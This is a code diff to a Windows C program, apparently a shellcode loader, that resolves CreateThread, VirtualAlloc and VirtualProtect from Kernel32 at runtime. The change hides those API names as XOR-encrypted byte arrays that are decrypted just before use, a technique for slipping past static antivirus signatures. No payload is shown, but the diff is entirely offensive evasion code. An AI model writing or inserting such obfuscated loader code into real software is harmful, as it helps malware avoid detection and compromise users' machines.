@@ -57,9 +57,14 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     CREATETHREAD createThread;
     VIRTUALALLOC  virtualAlloc;
     VIRTUALPROTECT virtualProtect;
+    unsigned char kern[] = <KERNEL32>
+    unsigned char crea[] = <CREATE_THREAD>
+    unsigned char virProtect[] = <VIRTUAL_PROTECT>
+    unsigned char virAlloc[] = <VIRTUAL_ALLOC>
 
     // More dynamic invoke shit
-    kernelHandle = LoadLibraryA("Kernel32.dll");
+    xor_data(kern, sizeof(kern), key, key_len);
+    kernelHandle = LoadLibraryA((LPCSTR) kern);
 
     if (kernelHandle == NULL)
     {
@@ -67,7 +72,8 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     }
 
     // Get pointer to functions which we can invoke
-    createThread = (CREATETHREAD)GetProcAddress(kernelHandle, "CreateThread");
+    xor_data(crea, sizeof(crea), key, key_len);
+    createThread = (CREATETHREAD)GetProcAddress(kernelHandle, (LPCSTR) crea);
 
     if (!createThread)
     {
@@ -75,8 +81,8 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
         FreeLibrary(kernelHandle);
         return 2;
     }
-
-    virtualAlloc = (VIRTUALALLOC)GetProcAddress(kernelHandle, "VirtualAlloc");
+    xor_data(virAlloc, sizeof(virAlloc), key, key_len);
+    virtualAlloc = (VIRTUALALLOC)GetProcAddress(kernelHandle, (LPCSTR) virAlloc);
 
     if (!virtualAlloc)
     {
@@ -85,7 +91,8 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
         return 2;
     }
 
-    virtualProtect = (VIRTUALPROTECT)GetProcAddress(kernelHandle, "VirtualProtect");
+    xor_data(virProtect, sizeof(virProtect), key, key_len);
+    virtualProtect = (VIRTUALPROTECT)GetProcAddress(kernelHandle, (LPCSTR) virProtect);
 
     if (!virtualProtect)
     {
